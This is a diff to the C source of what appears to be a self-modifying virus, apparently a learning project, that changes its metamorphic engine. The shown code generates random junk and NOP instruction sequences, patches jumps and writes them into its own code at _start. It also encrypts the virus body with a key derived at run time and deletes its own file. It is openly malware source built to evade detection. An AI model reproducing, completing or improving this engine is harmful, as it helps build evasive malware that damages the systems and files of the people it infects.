@@ -3,7 +3,6 @@
 #include <fcntl.h>
 #include <unistd.h>
 
-
 #include "utils.h"
 #include "death.h"
 #include "data.h"
@@ -13,24 +12,11 @@ extern void __attribute__((naked)) _start(void);
 extern void end(void);
 extern int64_t g_key;
 
-#define ABS(x) ((x) < 0 ? -(x) : (x))
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
 uint16_t __attribute__((section(".text#"))) g_ri = 0;
-
-uint8_t ft_nrand(void);
-
-#define RANDOM_CALL jfs.junk_function[ft_nrand()%4]();
-
-#define NB_CALLS 4
-
-typedef void (*junk_function_p) ();
-
-struct junk_function_s {
-	junk_function_p junk_function[NB_CALLS];
-} jfs __attribute__((section(".text#")));
 
 void junk_death(void) {
 	char tmp = 0;
@@ -40,6 +26,12 @@ void junk_death(void) {
 	tmp = a;
 	a = b;
 	b = tmp;
+}
+
+static inline uint8_t ft_nrand(void) {
+	uint8_t rand = g_rand[g_ri];
+	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
+	return rand;
 }
 
 static int find_pattern(uint8_t *self, size_t offset) {
@@ -54,12 +46,15 @@ static int find_pattern(uint8_t *self, size_t offset) {
 			self[offset + 6] == XCHG &&
 			self[offset + 7] == RAX_RAX &&
 
-			self[offset + 8] == OP_64 &&
-			self[offset + 9] == XCHG &&
-			self[offset + 10] == RAX_RAX &&
+			self[offset + 8] == POP_RBX &&
+			self[offset + 9] == POP_OP);
 
-			self[offset + 11] == POP_RBX &&
-			self[offset + 12] == POP_OP);
+			//self[offset + 8] == OP_64 &&
+			//self[offset + 9] == XCHG &&
+			//self[offset + 10] == RAX_RAX &&
+
+			//self[offset + 11] == POP_RBX &&
+			//self[offset + 12] == POP_OP);
 }
 
 static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
@@ -123,14 +118,6 @@ static uint8_t get_random_opcode(uint8_t rand) {
 
 }
 
-inline uint8_t ft_nrand(void) {
-	uint8_t rand = g_rand[g_ri];
-	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
-	return rand;
-}
-
-/* {2, 4jmp, 6, 10} */
-
 static void patch_jmp(uint8_t *nop, int *instr_off, int instr_len, int jmp_offset) {
 
 	int dest_i = ft_nrand() % (instr_len + 1);
@@ -142,41 +129,23 @@ static void patch_jmp(uint8_t *nop, int *instr_off, int instr_len, int jmp_offse
 	}
 }
 
-//static inline void *get_rip(void) {
-//	void *rip;
-//	__asm__ __volatile__("lea (%%rip), %0" : "=r"(rip));
-//	return rip;
-//}
-
-unsigned long get_rip(void)
-{
-    long ret;
-    __asm__ __volatile__ 
-    (
-        "call get_rip_label    \n"  // Appelle l'étiquette `get_rip_label`, empile l'adresse de retour (RIP)
-        ".globl get_rip_label  \n"  // Rend `get_rip_label` accessible globalement (optionnel ici)
-        "get_rip_label:        \n"  // Point de retour de l'appel
-        "pop %%rax             \n"  // Dépile l'adresse stockée dans la pile (c'était RIP au moment de CALL)
-        "mov %%rax, %0" : "=r"(ret) // Stocke cette adresse dans `ret`
-    );
-
-    return ret;
-}
-
 static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
-	int nop_size = JUNK_LEN - 4;
+	int nop_size = NOPS_LEN;
 	int bytes_len = 0;
 	int offset = 0;
 
 	int instr_off[MAX_INSTR];
+
 	int instr_count = 0;
 
 	int jmp_index = -1;
 
 	while (nop_size > 0) {
-		bytes_len = (ft_nrand() % 4) + 2;
+		bytes_len = (ft_nrand() % 2) + 2;
 		//bytes_len = 5;
+
+
 		if (nop_size < bytes_len) {
 			bytes_len = nop_size;
 		}
@@ -184,7 +153,6 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 		if (bytes_len == 0) {
 			break;
 		}
-
 
 		switch (bytes_len) {
 			case 1:
@@ -214,6 +182,7 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 			case 5: 
 				{
 					nop[offset] = 0xE8;
+
 					int32_t rel_offset = (int32_t)((uintptr_t)junk_death - (uintptr_t)_start);
 					rel_offset = rel_offset - (file_off + 0x7 + offset);
 					//_printf("rel_offset: %x\n", rel_offset);
@@ -271,7 +240,6 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 	rdm_junk[1] = push_2;
 
 	ft_memcpy(rdm_junk + 2, nop, NOPS_LEN);
-	//_printf("%x %x %x %x %x %x\n", nop[0], nop[1], nop[2], nop[3], nop[4], nop[5]);
 
 	rdm_junk[JUNK_LEN - 2] = pop_2;
 	rdm_junk[JUNK_LEN - 1] = pop_1;
@@ -316,15 +284,7 @@ void prepare_mutate(void) {
 
 	getrandom(g_rand, RAND_SIZE, 0);
 
-	jfs.junk_function[0] = junk_death;
-	jfs.junk_function[1] = junk_death;
-	jfs.junk_function[2] = junk_death;
-	jfs.junk_function[3] = junk_death;
-
-
 	JUNK;
-
-	RANDOM_CALL;
 
 	if (g_junk_offsets[0] != 0)
 		return;
@@ -339,6 +299,7 @@ void mutate(void) {
 	uintptr_t start = (uintptr_t)&_start;
 
 	replace_nop((uint8_t *)start, g_junk_offsets);
+
 }
 
 int death(int start_offset, file_t *file) {
@@ -353,7 +314,7 @@ int death(int start_offset, file_t *file) {
 	uint8_t *entry = self + start_offset;
 
 	if (start_offset != 0x1000) 
-		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);
+		encrypt(entry, VIRUS_SIZE, g_key);
 
 
 	JUNK;
@@ -365,7 +326,7 @@ int death(int start_offset, file_t *file) {
 	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
 
 	if (start_offset != 0x1000)
-		encrypt(entry, VIRUS_SIZE, DEFAULT_KEY);
+		encrypt(entry, VIRUS_SIZE, g_key);
 
 	if (unlink(self_name) == -1) {
 		munmap(self, file->view.size);
